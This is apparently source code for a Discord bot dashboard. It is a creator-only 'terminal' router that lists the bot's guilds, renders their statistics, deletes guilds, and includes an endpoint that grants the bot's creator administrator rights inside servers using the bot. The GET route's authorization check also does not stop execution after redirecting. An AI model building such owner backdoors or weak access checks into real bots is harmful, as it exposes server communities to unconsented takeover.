const { User, Guild, getDatabase, getLanguagePack, log } = require('../utils');
const { getGuildsList, toggleAdminPermissions, deleteGuild } = require('../discord');
const express = require('express');
const router = express.Router();
const fs = require('fs');
const ejs = require('ejs');

router.get('/', async (request, response) => {
  const user = new User();
  await user.fetch(request.cookies.token);
  !user.isCreator ? response.redirect('/') : null;

  const lang = getLanguagePack(request.cookies.lang);

  const Guilds = await getDatabase("guilds");
  let guilds = await Guilds.find({})
  .toArray();

  guilds = guilds.sort((a, b) => {
    if (!a.isBotAdmin && !b.isBotAdmin) return b.members - a.members;
    if (!a.isBotAdmin) return 1;
    if (!b.isBotAdmin) return -1;
    return b.members - a.members;
  });

  const guild = new Guild();
  await guild.fetch(guilds[0].id);
  guilds.find(guildDb => guildDb.id === guild.id).parsedStatistics = guild.parseStatistics()

  try {
    const terminalData = {
      user,
      guilds,
      lang
    };

    const body = ejs.render(fs.readFileSync('views/terminal.ejs', 'utf8'), terminalData);

    response.render('template.ejs', {
      body,
      user,
      lang
    });
  } catch (error) {
    console.log(error);
    response.redirect('/');
  }
});

router.post('/guild-mode-select', async (request, response) => {
  const user = new User();
  await user.fetch(request.cookies.token);
  if (!user.isCreator) return response.redirect('/');
  
  const lang = getLanguagePack(request.cookies.lang);

  const guild = new Guild();
  await guild.fetch(request.body.id);
  guild.parseStatistics()
  
  if (guild.id) {
    const body = ejs.render(fs.readFileSync('views/modules/terminal/guild/body.ejs', 'utf8'), { guild, lang });
    log(`Надіслано: ${(body.length / 1024 / 1024 * 8).toFixed(1)} мегабайти`, 'p')
    response.status(200).send(body);
  } else {
    response.status(403).send()
  }
});

router.post('/get-admin-permisson', async (request, response) => {
  const user = new User();
  await user.fetch(request.cookies.token);
  if (!user.isCreator) return response.redirect('/');

  const guild = new Guild();
  await guild.fetch(request.body.id);

  guild.isMiregAdmin = await toggleAdminPermissions(request.body.id, user.id);

  if (guild.id) {
    const body = ejs.render(fs.readFileSync('views/modules/terminal/guild/main-panel-buttons.ejs', 'utf8'), { guild });
    response.status(200).send(body);
    await guild.save();
  } else {
    response.status(403).send()
  }
});

router.post('/delete-guild', async (request, response) => {
  const user = new User();
  await user.fetch(request.cookies.token);
  if (!user.isCreator) return response.redirect('/');

  const guild = new Guild();
  await guild.fetch(request.body.id);

  await deleteGuild(request.body.id);

  if (guild.id) {
    const body = ejs.render(fs.readFileSync('views/modules/terminal/guild/main-panel-buttons.ejs', 'utf8'), { guild });
    response.status(200).send(body);
    await guild.save();
  } else {
    response.status(403).send()
  }
});

module.exports = router;